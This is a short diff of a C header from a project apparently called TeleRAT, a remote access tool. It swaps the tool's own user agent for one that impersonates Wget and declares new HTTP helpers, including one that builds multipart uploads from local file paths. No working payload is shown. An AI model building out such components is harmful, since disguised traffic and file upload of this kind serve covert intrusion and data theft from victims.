@@ -5,7 +5,8 @@
 #include <stdlib.h>
 #include <string.h>
 
-#define USER_AGENT "TeleRAT/0.1.0"
+// #define USER_AGENT "TeleRAT/0.1.0"
+#define USER_AGENT "Wget/1.17.1 (linux-gnu)"
 #define SERVER "TeleRAT"
 #define BOUNDARY "teleratboundary123456789"
 
@@ -27,8 +28,15 @@ struct http_response{
     unsigned int content_length;
 };
 
-void request_header(struct http_request *request, char **buffer);
-void response_header(struct http_response *response, char **buffer);
-void create_boundary(char *data, char *buffer);
+struct http_data{
+    unsigned int index;
+    char *data;
+};
+
+void request_header(struct http_request *request, char *buffer);
+void response_header(struct http_response *response, char *buffer);
+void create_boundary(char **buffer, char *data, char *input_name);
+void create_file_boundary(char **buffer, char *file_path, char *input_name);
+void reverse_str(char *destination, char *source);
 
 #endif
